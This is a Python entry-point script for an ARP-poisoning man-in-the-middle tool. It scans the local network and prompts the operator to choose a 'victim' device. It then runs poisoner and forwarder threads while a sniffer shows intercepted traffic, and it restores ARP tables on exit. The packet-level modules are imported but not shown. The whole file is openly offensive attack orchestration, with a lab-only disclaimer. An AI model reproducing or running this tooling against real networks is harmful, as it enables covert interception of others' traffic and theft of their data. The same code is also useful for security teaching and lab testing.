#!/usr/bin/env python3
"""
Entry point for the attacker side. Discovers the network, lets the
operator pick a target from a live scan, then runs the poisoner and
forwarder in the background while the sniffer reports intercepted
traffic in the foreground. Ctrl+C stops everything and restores the
ARP tables before exiting.
"""
import os
import sys
import signal
import threading
from config import choose_interface, scan_network, TARGET_CONFIG
from poisoner import run_poisoner
from forwarder import run_forwarder
from sniffer import run_sniffer
from restorer import restore_network


def main():
    """
    Drive the whole attack: privilege check, interface/target selection,
    then hand off to the poisoner/forwarder/sniffer/restorer modules.

    This function only orchestrates -- all the actual packet-level work
    (spoofing, relaying, capturing, healing) lives in the other modules,
    keeping this file focused on setup and the operator interaction.
    """
    # Raw sockets (used by scapy to craft/send ARP and Ethernet frames)
    # require root, so fail fast with a clear message instead of an
    # opaque permission error later during the scan.
    if os.geteuid() != 0:
        print("[-] Error: this script must be run with root privileges (sudo).")
        sys.exit(1)

    print("[!] Lab/demo use only -- run this only against devices you own or")
    print("    have explicit permission to test.\n")

    interface = choose_interface()

    gateway_ip, devices, attacker_mac = scan_network(interface)
    gateway_mac = None

    print("\n[+] Active devices found on network:")
    print(f"{'Index':<6} {'IP Address':<18} {'MAC Address':<18}")
    print("-" * 42)

    for idx, dev in enumerate(devices):
        if dev['ip'] == gateway_ip:
            gateway_mac = dev['mac']
            print(f"{idx:<6} {dev['ip']:<18} {dev['mac']:<18} (Gateway)")
        else:
            print(f"{idx:<6} {dev['ip']:<18} {dev['mac']:<18}")

    if not gateway_mac:
        print("[-] Error: could not identify gateway MAC.")
        sys.exit(1)

    try:
        choice = int(input("\n[?] Enter the index number of the victim device: "))
        # Poisoning the gateway against itself makes no sense as an
        # attack, so explicitly reject that choice via the same
        # exception path used for out-of-range/non-numeric input.
        if devices[choice]['ip'] == gateway_ip:
            raise ValueError
        victim_ip = devices[choice]['ip']
        victim_mac = devices[choice]['mac']
    except (ValueError, IndexError):
        print("[-] Invalid selection (or you picked the gateway). Exiting.")
        sys.exit(1)

    TARGET_CONFIG["interface"] = interface
    TARGET_CONFIG["attacker_mac"] = attacker_mac
    TARGET_CONFIG["gateway_ip"] = gateway_ip
    TARGET_CONFIG["gateway_mac"] = gateway_mac
    TARGET_CONFIG["victim_ip"] = victim_ip
    TARGET_CONFIG["victim_mac"] = victim_mac

    print(f"\n[+] Target locked -> Victim IP: {victim_ip} | Victim MAC: {victim_mac}")
    print(f"[+] Gateway locked -> Gateway IP: {gateway_ip} | Gateway MAC: {gateway_mac}")
    print("[*] Starting attack framework...\n")

    # Registered only AFTER TARGET_CONFIG is fully populated: restore_network()
    # reads gateway/victim IP+MAC from TARGET_CONFIG, so if Ctrl+C arrived
    # any earlier the handler would have nothing valid to restore.
    def handle_exit(sig, frame):
        print("\n[*] Shutting down and restoring the network...")
        restore_network()
        sys.exit(0)

    # SIGINT (Ctrl+C) is the normal way to stop the attack; SIGTERM is
    # caught too so a `kill` from another terminal also triggers cleanup
    # instead of leaving both hosts' ARP caches poisoned.
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    # Poisoning and forwarding must both run continuously and concurrently
    # with the sniffer, so they're pushed onto background threads. daemon=True
    # means they're killed automatically when the process exits, so we don't
    # need to explicitly join() or stop them on shutdown.
    poison_thread = threading.Thread(target=run_poisoner, daemon=True)
    forward_thread = threading.Thread(target=run_forwarder, daemon=True)

    poison_thread.start()
    forward_thread.start()

    # Runs on the main thread (blocking) rather than another daemon thread,
    # since it's the one component whose live output the operator actually
    # watches; it also keeps the process alive until Ctrl+C is pressed.
    run_sniffer()


if __name__ == "__main__":
    main()